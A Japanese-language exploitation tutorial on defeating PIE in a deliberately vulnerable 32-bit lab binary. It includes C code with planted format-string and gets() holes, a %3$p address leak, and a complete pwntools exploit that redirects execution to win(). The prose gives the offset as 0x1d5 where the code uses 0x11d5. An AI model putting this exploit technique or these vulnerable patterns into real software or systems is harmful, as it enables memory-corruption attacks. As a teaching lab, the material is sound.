---
description: フォーマット文字列を使う
---

# PIE Bypass

## The Source

{% file src="../../../.gitbook/assets/pie-fmtstr.zip" caption="PIE + Format String - 32-bit" %}

```c
#include <stdio.h>

void vuln() {
    char buffer[20];

    printf("What's your name?\n");
    gets(buffer);
    
    printf("Nice to meet you ");
    printf(buffer);
    printf("\n");

    puts("What's your message?");

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

前回とは違い、今回は関数のアドレスを教えてもらえません。フォーマット文字列を使ってリークする必要があります。

## Analysis

```text
$ ./vuln-32 

What's your name?
%p
Nice to meet you 0xf7f6d080
What's your message?
hello
```

すべて想定どおりです。

## Exploitation

### Setup

前回と同様に、まず準備をします。

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()
```

### PIE Leak

次に必要なのはリークです。いくつかオフセットを試してみましょう。

```text
$ ./vuln-32 
What's your name?
%p %p %p %p %p
Nice to meet you 0xf7eee080 (nil) 0x565d31d5 0xf7eb13fc 0x1
```

3番目がバイナリのアドレスのようです。radare2 で、この3番目のリーク値とベースアドレスの差を確認しましょう。フォーマット文字列のリークより後であれば、どこでもよいのでブレークポイントを設定します(場所はあまり重要ではありません)。

```text
$ r2 -d -A vuln-32 

Process with PID 5548 started...
= attach 5548 5548
bin.baddr 0x565ef000
0x565f01c9]> db 0x565f0234
[0x565f01c9]> dc
What's your name?
%3$p
Nice to meet you 0x565f01d5
```

ベースアドレスは `0x565ef000`、リークした値は `0x565f01d5` です。したがって、リークしたアドレスから `0x1d5` を引けばバイナリのベースが得られるはずです。値をリークして、ベースアドレスを求めましょう。

```python
p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x11d5
log.success(f'PIE base: {hex(elf.address)}') # 必須ではないが、確認になる
```

あとはエクスプロイトのペイロードを送るだけです。

```python
payload = b'A' * 32
payload += p32(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())
```

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x11d5
log.success(f'PIE base: {hex(elf.address)}')

payload = b'A' * 32
payload += p32(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())
```

## 64-bit

やることは同じで、64ビットになるだけです。試してみてください :\)

{% file src="../../../.gitbook/assets/pie-fmtstr-64.zip" caption="PIE + Format String - 64-bit" %}


